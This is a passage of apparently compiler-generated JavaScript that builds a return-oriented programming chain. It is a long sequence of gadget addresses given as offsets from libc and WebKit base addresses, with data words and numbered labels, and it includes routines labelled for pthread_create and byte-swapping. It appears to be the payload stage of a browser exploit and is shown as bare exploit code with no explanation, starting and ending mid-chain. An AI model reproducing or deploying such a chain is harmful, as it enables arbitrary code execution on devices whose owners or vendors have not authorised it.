libc_base+362222, //pop rsi
ropchain+143040, //L2003-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2002:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2003:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2004:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+143152, //L2005-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+143168, //L2006-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2005:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2006:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+143280, //L2007-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+143264, //L2008-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2008:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2007:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+143368, //L2010-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+143352, //L2009-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2009:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2010:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+143464, //L2011-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+143480, //L2012-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2011:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2012:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+143592, //L2013-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+143576, //L2014-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2014:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2013:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+143664, //L2015-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L2015:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+143760, //L2017-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+143792, //L2020-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
webkit_base+1412577 //pop r8
]);
//L2017:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2018:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L2020:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+143896, //L2023-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+143880, //L2022-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2022:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2023:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224576, //mov ax, [rdi]
libc_base+362222, //pop rsi
ropchain+144056, //L2027-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+144008, //L2024-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+144040, //L2026-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2024:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2025:
db([16, 0]); // 0x10
set_gadget(libc_base+155394,); //pop rdi
//L2026:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2027:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+144112, //L2029-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L2029:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+144216, //L2030-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+144248, //L2032-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+144232, //L2031-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2030:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2031:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2032:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+144408, //L2036-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+144360, //L2033-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+144392, //L2035-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2033:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2034:
db([48, 0]); // 0x30
set_gadget(libc_base+155394,); //pop rdi
//L2035:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2036:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+144512, //L2038-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+144496, //L2037-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2037:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2038:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L2039:
db([8, 0]); // 0x8
set_gadget(libc_base+467092,); //pop rax
//L2040:
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+144720, //L2043-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+144688, //L2041-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2041:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2042:
db([48, 0]); // 0x30
set_gadget(libc_base+467092,); //pop rax
//L2043:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+144824, //L2045-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+144808, //L2044-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2044:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2045:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+144920, //L2048-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2046:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L2048:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+145024, //L2051-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+145008, //L2050-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2050:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2051:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224576, //mov ax, [rdi]
libc_base+362222, //pop rsi
ropchain+145184, //L2055-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+145136, //L2052-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+145168, //L2054-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2052:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2053:
db([16, 0]); // 0x10
set_gadget(libc_base+155394,); //pop rdi
//L2054:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2055:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+145240, //L2057-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L2057:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+145344, //L2058-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+145376, //L2060-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+145360, //L2059-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2058:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2059:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2060:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+145536, //L2064-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+145488, //L2061-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+145520, //L2063-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2061:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2062:
db([48, 0]); // 0x30
set_gadget(libc_base+155394,); //pop rdi
//L2063:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2064:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+145640, //L2066-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+145624, //L2065-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2065:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2066:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L2067:
db([8, 0]); // 0x8
set_gadget(libc_base+467092,); //pop rax
//L2068:
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+145840, //L2071-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+145808, //L2069-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2069:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2070:
db([32, 0]); // 0x20
set_gadget(libc_base+467092,); //pop rax
//L2071:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+145944, //L2073-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+145928, //L2072-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2072:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+146056, //L2076-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+146024, //L2074-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2074:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2075:
db([48, 0]); // 0x30
set_gadget(libc_base+467092,); //pop rax
//L2076:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+146120, //L2077-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+757614 //pop rcx
]);
//L2077:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+146176, //L2080-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2080:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222, //pop rsi
ropchain+146320, //L2082-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+146336, //L2083-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+146304, //L2081-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2081:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2082:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2083:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+146496, //L2087-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+146448, //L2084-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+146480, //L2086-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2084:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2085:
db([48, 0]); // 0x30
set_gadget(libc_base+155394,); //pop rdi
//L2086:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+146608, //L2088-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+146640, //L2090-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+146624, //L2089-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2088:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2089:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2090:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+146736, //L2091-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+146752, //L2092-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2091:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2092:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+146864, //L2093-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+146848, //L2094-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2094:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2093:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+146952, //L2096-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+146936, //L2095-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2095:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2096:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+147048, //L2097-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+147064, //L2098-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2097:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2098:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+147176, //L2099-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+147160, //L2100-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2100:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2099:
db([0, 0]); // 0x0
//_pthread_create__rop:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+147248, //L2101-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L2101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+147312, //L2103-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L2103:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967272, 4294967295]); // -0x18
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+147416, //L2105-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+147448, //L2107-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2105:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2106:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2107:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2108:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+147560, //L2110-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+147544, //L2109-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2109:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2110:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L2111:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L2112:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2113:
db([1, 0]); // 0x1
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L2114:
db([1, 0]); // 0x1
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2115:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+147872, //L2118-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2118:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L2119:
db([1, 0]); // 0x1
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2120:
db([2, 0]); // 0x2
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+148064, //L2123-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2123:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+148176, //L2124-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2124:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2125:
db([65536, 0]); // 0x10000
set_gadget(libc_base+155394,); //pop rdi
//L2126:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+148304, //L2128-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+148288, //L2127-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2127:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2128:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L2129:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2131:
ropchain+148472, //L2130
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+157968, //L2132
//L2130:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+148552, //L2133-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+148608, //L2136-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2136:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L2137:
db([65536, 0]); // 0x10000
set_gadget(libc_base+467092,); //pop rax
//L2138:
db([65536, 0]); // 0x10000
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+148760, //L2139-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2139:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+148816, //L2142-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2142:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+148904, //L2145-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2143:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L2145:
